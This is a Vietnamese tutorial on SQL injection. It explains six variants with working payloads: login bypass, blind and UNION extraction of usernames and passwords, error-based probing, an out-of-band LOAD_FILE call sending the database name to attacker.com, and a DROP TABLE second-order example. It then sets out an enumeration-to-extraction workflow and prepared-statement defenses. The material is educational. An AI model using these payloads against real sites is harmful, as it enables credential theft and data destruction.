# SQL Injection

Là một kỹ thuật tấn công mà kẻ tấn công **chèn mã SQL độc hại** vào truy vấn thông qua dữ liệu đầu vào không được kiểm soát.

| Dạng SQL Injection | Cơ chế hoạt động | Đặc điểm |
| --- | --- | --- |
| 1. Classic SQL Injection | Chèn mã SQL trực tiếp vào truy vấn thông qua đầu vào không được kiểm tra, thay đổi logic truy vấn. | Dễ phát hiện, cần output trực tiếp từ ứng dụng. |
| 2. Blind SQL Injection | Không thấy kết quả trực tiếp, suy ra thông tin qua phản hồi gián tiếp (boolean/time). | Không cần output, dựa vào phản hồi logic/thời gian. |
| 3. Union-based SQL Injection | Dùng UNION để nối kết quả truy vấn hợp lệ với dữ liệu từ bảng khác. | Cần khớp số cột và kiểu dữ liệu. |
| 4. Error-based SQL Injection | Gây lỗi trong truy vấn để khai thác thông tin từ thông báo lỗi của cơ sở dữ liệu. | Phụ thuộc vào cấu hình hiển thị lỗi. |
| 5. Out-of-Band SQL Injection | Trích xuất dữ liệu qua kênh khác (DNS/HTTP) thay vì giao diện ứng dụng. | Hiếm, cần điều kiện đặc biệt (DNS/HTTP). |
| 6. Second-Order SQL Injection | Mã độc được lưu vào cơ sở dữ liệu, sau đó bị khai thác trong một truy vấn khác mà không được xử lý an toàn. | Khó phát hiện, cần hai giai đoạn xử lý. |

# Example:

## 1. Classic SQL Injection

**Tình huống:** Một trang đăng nhập kiểm tra tên người dùng và mật khẩu thông qua truy vấn SQL.

Truy vấn gốc: 

```sql
SELECT * FROM users WHERE username = '[username]' AND password = '[pass]';
```

**Payload:**

- Username: `admin'--`
- Password: *(bỏ trống hoặc ghi gì cũng được )*

**Kết quả:**

```sql
SELECT * FROM users WHERE username = 'admin'--';
```

Dấu `--` biến phần kiểm tra mật khẩu thành chú thích, giúp kẻ tấn công đăng nhập mà không cần mật khẩu.

## 2. Blind SQL Injection

Blind SQL Injection xảy ra khi ứng dụng không hiển thị lỗi SQL nhưng vẫn có thể bị khai thác bằng cách quan sát phản hồi.

### a. Boolean-based Blind SQL Injection

**Tình huống**: Trang web xác thực `user_id`, phản hồi "Đúng" hoặc "Sai".

Truy vấn gốc:

```sql
SELECT * FROM users WHERE user_id = '[id]';
```

Payload: `1' AND SUBSTRING((SELECT database()), 1, 1) = 'a' --`

Kết quả: 

```sql
SELECT * FROM users WHERE user_id = '1' AND SUBSTRING((SELECT database()), 1, 1) = 'a' --
```

Nếu phản hồi "Đúng", nghĩa là tên database bắt đầu bằng chữ 'a'. Kẻ tấn công có thể thử từng ký tự để xác định tên cơ sở dữ liệu.

### b. Time-based Blind SQL Injection

**Tình huống:** Trang không hiển thị phản hồi, nhưng có thể đo thời gian phản hồi.

**Payload:** `1' AND IF(1=1, SLEEP(5), 0) --` 

Kết quả: 

```sql
SELECT * FROM users WHERE user_id = '1' AND IF(1=1, SLEEP(5), 0) --
```

Nếu trang mất 5 giây để phản hồi, kẻ tấn công có thể suy luận dữ liệu thông qua thời gian phản hồi.

## 3. Union-based SQL Injection

**Tình huống:** Trang hiển thị thông tin sản phẩm dựa trên `product_id`.

Truy vấn gốc:

```sql
SELECT name, price FROM products WHERE product_id = '[id]';
```

**Payload:** `1' UNION SELECT username, password FROM users --`

Kết quả: 

```sql
SELECT name, price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --;
```

Nếu số lượng cột của bảng `products` khớp với bảng `users`, thông tin nhạy cảm sẽ bị lộ trên giao diện người dùng.

## 4. Error-based SQL Injection

**Tình huống:** Trang web trả về thông báo lỗi cơ sở dữ liệu.

Truy vấn gốc: 

```sql
SELECT * FROM users WHERE user_id = '[id]';
```

Payload: `1' AND CAST((SELECT version()) AS INT) --`

Kết quả: 

```sql
SELECT * FROM users WHERE user_id = '1' AND CAST((SELECT version()) AS INT) --
```

Nếu truy vấn này gây ra lỗi (ví dụ: "Conversion failed when converting the varchar value 'MySQL 8.0.23' to data type int"), kẻ tấn công có thể xác định phiên bản cơ sở dữ liệu đang sử dụng, từ đó có thể có được các thông tin khác.

## 5. Out-of-Band SQL Injection

**Tình huống:** Kẻ tấn công có thể trích xuất dữ liệu bằng cách gửi nó đến một server bên ngoài thông qua DNS hoặc HTTP request.

Truy vấn gốc:

```sql
SELECT * FROM users WHERE username = '[user_name]';
```

Payload:`' AND 1=(SELECT LOAD_FILE(CONCAT('\\', (SELECT database()), '.attacker.com\test')))--`
Kết quả: 

```sql
SELECT * FROM users WHERE username = '' AND 1=(SELECT LOAD_FILE(CONCAT('\\', (SELECT database()), '.attacker.com\test')))--
```

Nếu truy vấn thành công, cơ sở dữ liệu sẽ gửi yêu cầu DNS đến `attacker.com`, tiết lộ tên cơ sở dữ liệu cho kẻ tấn công.

## 6. Second-Order SQL Injection

**Tình huống**: Một ứng dụng cho phép người dùng cập nhật tên tài khoản của họ. Tên mới này được lưu trữ trong cơ sở dữ liệu và sau đó được sử dụng trong một truy vấn khác để hiển thị hoặc xử lý dữ liệu.
Kẻ tấn công cập nhật tên người dùng

```sql
UPDATE users SET username = 'hacker'); DROP TABLE users; --' WHERE user_id = 123;
```

Câu lệnh này được hệ thống lưu trữ mà không gây ra lỗi ngay lúc đó.

Hệ thống sử dụng dữ liệu đã bị nhiễm độc. 
Một truy vấn khác sử dụng giá trị `username` mới mà không xử lý an toàn:

```sql
SELECT * FROM users WHERE username = 'hacker'); DROP TABLE users; --';
```

Khi truy vấn này chạy, bảng `users` sẽ bị xóa do câu lệnh SQL độc hại đã được lưu trước đó.

# Quy trình tấn công

## 1. Phát hiện lỗ hổng

Tập trung vào các điểm nhập dữ liệu (user input) gửi đến cơ sở dữ liệu, vd như: 

- Form đăng nhập (username, password).
- Thanh tìm kiếm (search bar).
- Tham số URL

Thử nghiệm bằng cách chèn các ký tự đặc biệt như dấu nháy đơn `'` hoặc dấu nháy kép `"` vào input.

Quan sát phản hồi:

- Nếu ứng dụng trả về thông báo lỗi SQL (ví dụ: You have an error in your SQL syntax), đây là dấu hiệu rõ ràng của lỗ hổng.
- Nếu phản hồi là trang trắng, lỗi chung hoặc hành vi bất thường, cần kiểm tra thêm.

## 2. Xác định loại SQL Injection

Thử `' OR 1=1 --`: Nếu trả về tất cả dữ liệu, có thể là Union-based SQLi.

Thử  `' AND 1=2 --`: Nếu không trả về dữ liệu nhưng ' AND 1=1 -- hoạt động bình thường, có thể là Blind SQLi.

Gây lỗi có chủ đích: `' OR CONVERT(int, (SELECT @@version)) --` để kiểm tra Error-based SQLi.

**Ví dụ:**

- `http://example.com/product?id=1' OR 1=1 --` → Hiển thị toàn bộ dữ liệu.
- `http://example.com/product?id=1' AND SLEEP(5) --` → Trang tải chậm 5 giây (Time-based Blind SQLi).

Vân vân và vân vân

## 3. Xác định cấu trúc cơ sở dữ liệu

### Đếm số cột:

- Sử dụng từ khóa **ORDER BY** để kiểm tra số cột mà truy vấn gốc trả về.
- Cách thực hiện: Thêm **ORDER BY** n -- vào input (với n là số nguyên tăng dần) và quan sát phản hồi của ứng dụng.
- Quy tắc:
    - • Nếu ORDER BY n không gây lỗi, số cột trong truy vấn ≥ n.
    - • Khi ORDER BY n gây lỗi (ví dụ: Invalid column number), số cột là n-1.

### Kiểm tra bằng UNION:

- Sử dụng câu lệnh UNION SELECT để xác nhận số cột và kiểm tra khả năng hiển thị dữ liệu trên giao diện.
- Cách thực hiện: Thêm UNION SELECT 1,2,3,... với số lượng giá trị tương ứng số cột đã xác định.
- Quan sát: Nếu trang web hiển thị một trong các giá trị (1, 2, 3), cột đó có thể được khai thác trực tiếp.
- Ví dụ:
    - http://example.com/product?id=1 UNION SELECT 1,2,3 --
    - Kết quả: Trang hiển thị "2" ở một vị trí → Cột thứ hai có thể được dùng để chèn dữ liệu.
- Lưu ý: Nếu không hiển thị gì, có thể là Blind SQLi, cần chuyển sang kỹ thuật khác.

### Xác định loại database:

Dùng các hàm hoặc biến hệ thống đặc trưng của từng loại database để kiểm tra.

- MySQL: `SELECT @@version` (trả về phiên bản MySQL, ví dụ: 8.0.23).
- MSSQL: `SELECT @@version` (trả về thông tin SQL Server, ví dụ: Microsoft SQL Server 2019).
- PostgreSQL: `SELECT version()` (trả về PostgreSQL 15.1).
- Oracle: `SELECT banner FROM v$version` (trả về Oracle Database 19c).

Lưu ý: Nếu không hiển thị trực tiếp, thử Blind SQLi như `AND substring(@@version,1,1)='A'` để suy ra từng ký tự.

**Kết quả mong đợi:** Biết chính xác số cột và loại cơ sở dữ liệu , tạo tiền đề cho khai thác dữ liệu.

## 4. Khai thác dữ liệu

### Bước 1: Lấy danh sách bảng

Dựa vào bảng hệ thống (system table) của từng loại database để truy vấn danh sách bảng.

**MySQL**: Sử dụng `information_schema.tables`.

- Câu lệnh: `UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --`

**MSSQL**: Sử dụng `sys.tables`.

- Câu lệnh: `UNION SELECT name,2,3 FROM sys.tables --`

**PostgreSQL**: `UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='public' —`
Kết quả: Trả về tên các bảng như users, products, orders.

### Bước 2: Lấy danh sách cột

Truy vấn các cột trong bảng mục tiêu (ví dụ: users).

Cách thực hiện:

- MySQL: `UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --`  (’user’ là tên bảng lấy được từ bước 1 )
- MSSQL: `UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --`

Kết quả: Trả về như id, username, password.

### Bước 3: Trích xuất dữ liệu

Dùng UNION SELECT để lấy dữ liệu từ các cột đã xác định.

Ví dụ:

- http://example.com/product?id=1 UNION SELECT username,password,3 FROM users --
- Kết quả: Trang hiển thị "admin | 123456" → Lấy được thông tin đăng nhập.

Nếu nhiều dòng dữ liệu, thử thêm LIMIT ( hoặc `group_concat()`):

- UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 0 -- (dòng đầu tiên).
- UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 1 -- (dòng thứ hai).

Trường hợp Blind SQLi:

- **Boolean-based:**
    
         - Kiểm tra từng ký tự: `AND SUBSTRING((SELECT database()),1,1)='a' --`
         - Nếu trang trả về bình thường, ký tự đầu tiên của tên database là 'a'.
    
- **Time-based:
     -** Dùng hàm thời gian: `AND IF(1=1, SLEEP(5), 0) --`
     - Nếu trang tải chậm 5 giây, xác nhận lỗ hổng và khai thác tiếp:
     - `AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(5), 0) --`
**Kết quả mong đợi:** Trích xuất thành công dữ liệu nhạy cảm (ví dụ: danh sách người dùng và mật khẩu).

## 5. Tăng cường khai thác

Mở rộng tấn công để thực thi lệnh hệ thống, đọc/ghi file, hoặc vượt qua các biện pháp bảo vệ.

# Các phương pháp phòng chống

## 1. Kiểm tra và Lọc Dữ liệu Đầu vào

**Mô tả:** Kiểm tra dữ liệu người dùng nhập vào, chỉ cho phép ký tự hợp lệ (ví dụ: không cho ký tự `'` hoặc `"` dựa trên ngữ cảnh.

Ví dụ: 

```php
$conn = new mysqli("localhost", "root", "", "test_db");
$username = preg_replace("/[^a-zA-Z0-9]/", "", "admin'; DROP TABLE users; --"); // Chỉ còn "admin"
$result = $conn->query("SELECT * FROM users WHERE username = '$username'");
echo $result->num_rows > 0 ? "Tìm thấy!" : "Không thấy!";
```

Mã độc bị loại bỏ, nhưng không triệt để, nếu kẻ tấn công tìm cách bypass phương pháp này có thể thất bại.

## 2. Escaping Dữ liệu

Thêm ký tự escape vào dữ liệu để ngăn các kí tự như `'`, `"` bị hiểu nhầm thành mã SQL.

**Nhược điểm:** Dễ sót nếu làm thủ công.

## 3.  Sử dụng Prepared Statements và Parameterized Queries

Đây là cách an toàn nhất để chống SQLi. Thay vì ghép trực tiếp dữ liệu người dùng vào câu lệnh SQL (dễ bị tấn công), ta dùng các "dấu chỗ" (`?` hoặc `:name`) để tách dữ liệu khỏi mã lệnh. Cơ sở dữ liệu sẽ xử lý dữ liệu như giá trị thuần túy, không thể thực thi thành lệnh nguy hiểm.

```php
$conn = new PDO("mysql:host=localhost;dbname=test_db", "root", "");
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute(["admin", "123'; DROP TABLE users; --"]);
echo $stmt->fetch() ? "Thành công!" : "Thất bại!";
```

**Cách hoạt động:**

- Dữ liệu "123'; DROP TABLE users; --" được gửi riêng qua execute(), không dính vào cấu trúc SQL.
- Kết quả: Cơ sở dữ liệu xem input là **chuỗi ký tự**.

**Ưu điểm:**

- Ngăn SQLi 100%, không cần lo kẻ tấn công nhập gì.
- Dễ áp dụng với thư viện PDO hoặc mysqli.

**Nhược điểm:** Không có, trừ việc cần học cách dùng nếu bạn mới bắt đầu.

## 4. Sử dụng ORM (Object-Relational Mapping)

ORM là công cụ tự động hóa truy vấn cơ sở dữ liệu, thường thấy trong các framework như Laravel. Thay vì viết SQL thủ công, bạn làm việc với các đối tượng (object), và ORM sẽ tạo truy vấn an toàn bằng cách dùng Prepared Statements bên trên. Điều này giúp lập trình viên tránh lỗi do viết truy vấn sai.

## 5. Hạn chế Quyền Cơ sở Dữ liệu

Phương pháp này tập trung vào việc giảm thiểu thiệt hại nếu SQLi xảy ra. Thay vì cho tài khoản cơ sở dữ liệu toàn quyền (như root), ta giới hạn quyền truy cập ở mức tối thiểu (ví dụ: chỉ cho phép đọc hoặc thêm dữ liệu, không cho xóa). Điều này giống như khóa các cửa phụ trong nhà để kẻ trộm khó phá hoại.

## Đánh giá

**Phương pháp tốt nhất:** **Prepared Statements** (phương pháp 3).

**Lý do:** Ngăn SQLi triệt để, dễ dùng, không cần phụ thuộc nhiều công cụ.